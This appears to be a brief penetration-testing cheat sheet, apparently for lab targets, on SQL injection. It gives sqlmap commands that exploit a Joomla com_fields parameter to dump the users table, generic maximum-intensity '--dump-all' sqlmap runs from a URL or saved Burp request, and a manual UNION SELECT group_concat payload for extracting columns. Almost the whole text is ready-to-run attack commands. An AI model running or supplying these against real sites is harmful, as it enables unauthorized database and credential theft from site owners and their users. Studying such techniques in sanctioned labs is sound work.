`sqlmap -u "http://10.10.10.10/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' –dump`

`sqlmap -u http://10.10.10.10 --level 5 --risk 3 --dump-all --threads 10`

Tends to be more succesful if you run it through BurpSuite and save the intercept
Run sqlmap to get as much information as you can:
`sqlmap -r sqltest --level 5 --risk 3 --dump-all --threads 10`
`-r` use a file rather than URL
`--level & --risk` increase intensity of scan
`--dump-all` dumps all possible data
`--threads` increases concurrent scans

This might get all the information you need, but if not, you should at least get the database name, table name and columns
If you don’t get everything in one go, you can dump the information from each column:
`' UNION SELECT (SELECT group_concat(<column name>,'~~') from <table name>),2,3,4; -- -`
Change 2,3,4 to match the number of columns
Put the `(SELECT group_concat(<column name>,'~~')` in whichever column is the vulnerable one

If in doubt, check the cheatsheet [SQLMAP Cheat Sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)
